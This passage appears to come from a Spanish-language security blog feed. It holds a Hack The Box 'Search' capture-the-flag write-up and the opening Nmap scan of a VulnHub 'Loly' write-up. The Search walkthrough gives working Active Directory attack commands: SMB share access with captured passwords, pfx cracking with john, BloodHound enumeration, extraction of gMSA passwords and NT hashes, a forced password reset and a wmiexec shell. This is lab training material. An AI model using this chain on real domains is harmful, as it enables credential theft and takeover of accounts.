SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ierra.frye:&lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a comprobar los Recursos de SMB para este usuario.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    ..
        dw--w--w--                0 Thu Nov 18 02:08:17 2021    Desktop
        dw--w--w--                0 Fri Jul 31 16:42:19 2020    Documents
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    Downloads
        fr--r--r--               33 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;s2&quot;&gt;&quot;user.txt&quot;&lt;/span&gt;
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/user.txt&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;33 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_user.txt

&lt;span class=&quot;c&quot;&gt;# cat user.txt                                                                      &lt;/span&gt;
39d6dde72c8e6b2a0d4exxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Enumeramos un poco mas ..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    ..
        dr--r--r--                0 Thu Jul 30 19:25:57 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    Backups
        fr--r--r--              282 Fri Jul 31 16:42:18 2020    desktop.ini

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads/Backups&apos; &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    ..
        fr--r--r--             2643 Fri Jul 31 17:04:11 2020    search-RESEARCH-CA.p12
        fr--r--r--             4326 Mon Aug 10 22:39:17 2020    staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;taff.pfx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4326 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;earch-RESEARCH-CA.p12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2643 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez descargados los dos archivos vemos que estamos ante un archivo .pfx (el cual podemos crackear) y un certificado que podemos importar en Firefox para acceder a algun recurso..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pfx2john staff.pfx &amp;gt; hash_pfx&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# # john  hash_pfx --show   &lt;/span&gt;
staff.pfx:misspissy:::::staff.pfx

1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer fuzzing en la pagina web&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.129/FUZZ&lt;/span&gt;

Target: http://10.10.11.129/FUZZ
Total requests: 220548

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000232:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;staff&quot;&lt;/span&gt; 
000000003:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt; 
000000190:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Images&quot;&lt;/span&gt;    
000000537:   301        1 L      10 W       147 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;css&quot;&lt;/span&gt;     
000000940:   301        1 L      10 W       146 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;js&quot;&lt;/span&gt;        
000002601:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;Staff&quot;&lt;/span&gt;     
000002758:   301        1 L      10 W       149 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;fonts&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probando la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;staff&quot;&lt;/code&gt; vemos que se nos pide un certificado, procedemos a subir el CA.p12 que nos hemos descargado y nos pide una contraseña introducimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misspissy&lt;/code&gt; la passwd obtenida para el archivo .pfx&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Accedemos a un panel &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/logon.aspx?ReturnUrl=%2fstaff%2f&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos Logueamos con el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sierra.frye&lt;/code&gt; y su pass, machine name –&amp;gt; Research&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Obtenemos una consola interactiva &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/console.aspx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obtenida la Flag de user.txt procedemos inicializar Neo4j y a enumerar con BloodHound, para ver como podriamos llegar a ser administradores del Dominio.&lt;/p&gt;

&lt;p&gt;Como ya poseemos credenciales validas podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound.py&lt;/code&gt; para recolectar informacion del sistema.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 /opt/BloodHound.py/bloodhound.py -u hope.sharp -p &quot;IsolationIsKey?&quot; -d search.htb -ns 10.10.11.129 --zip&lt;/span&gt;
20220606130949_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cargamos el .zip en BloodHound –&amp;gt; y marcamos los usuarios que ya tenemos como Owned o Pwned
Procedemos a irnos a Shortest Paths y desde el usuario Sierra Frye pinchamos en Shortest Parth from Owned Principals&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sierra.Frye Pertenece a &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: Birmingham-itsec@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: ITSECT@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ReadGMSAPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; user: BIR-ADFS-GMSA@SEARCH.HTB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Abusando de  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReadGMSAPassword&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AD &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ReadGMSAPassword Powershell
Procedemos de la siguiente forma:
Get-ADServiceAccount 

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 

Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

 

DistinguishedName    : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;BIR-ADFS-GMSA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;search,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
Enabled              : True
msds-ManagedPassword : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1, 0, 0, 0...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Name                 : BIR-ADFS-GMSA
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : 48cd6c5b-56cb-407e-ac2b-7294b5a44857
SamAccountName       : BIR-ADFS-GMSA&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
SID                  : S-1-5-21-271492789-1610487937-1871574529-1299
UserPrincipalName    : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial en formato NT Hash–&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt;.’msds-managedpassword’

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertTo-NTHash &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;.securecurrentpassword
e1e9fd9e46d0d747e1595167eedcec0f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msDS-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;&apos;msDS-ManagedPassword&apos;&lt;/span&gt;


PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;

Version                   : 1

CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾ롤
                            ᒛ�䬁ማ譿녓鏶骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇

SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 2862.13:38:54.3458092
UnchangedPasswordInterval : 2862.13:33:54.3458092
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Uso de ScriptBlock para ejecutar Comando como el usuario BIR-ADFS-GMSA –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.SecureCurrentPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; , &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
search&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ir-adfs-gmsa&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;—– Cambiando la Password al usuario Tristan Davies ——–&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; net user tristan.davies Password123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;– Conexion una vez cambiada la password –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmiexec.py search.htb/tristan.davies:&lt;span class=&quot;s1&quot;&gt;&apos;Password123$&apos;&lt;/span&gt;@10.10.11.129 &lt;span class=&quot;nt&quot;&gt;-shell-type&lt;/span&gt; cmd  &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.11.129
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SMBv3.0 dialect used
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Launching semi-interactive shell - Careful what you execute
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;search&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ristan.davies

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
4e22ea74086xxxxxxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Machine Rooteada =), que tiemble el examen del OSCP&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="SmbClient," /><category term="SmbMap," /><category term="Enumeracion," /><category term="Excell" /><category term="ByPass" /><category term="Proteccions," /><category term="Myssql-Server," /><category term="Kerberoasting" /><category term="Attack," /><category term="Import" /><category term="CA" /><category term="Firefox," /><category term="pfx2john," /><category term="ReadGMSAPassword," /><category term="BloodHound," /><category term="Maquinas" /><category term="Retiradas." /><summary type="html">Querier ~ Hack The Box</summary></entry><entry><title type="html">Maquina Loly de Offensive Security (No necesario VIP)</title><link href="http://localhost:4000/2022/05/10/Loly.html" rel="alternate" type="text/html" title="Maquina Loly de Offensive Security (No necesario VIP)" /><published>2022-05-10T00:00:00-03:00</published><updated>2022-05-10T00:00:00-03:00</updated><id>http://localhost:4000/2022/05/10/Loly</id><content type="html" xml:base="http://localhost:4000/2022/05/10/Loly.html">&lt;h1 id=&quot;loly--offensive-security--vulnhub&quot;&gt;Loly ~ Offensive Security ~ VulnHub&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 192.168.224.121       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

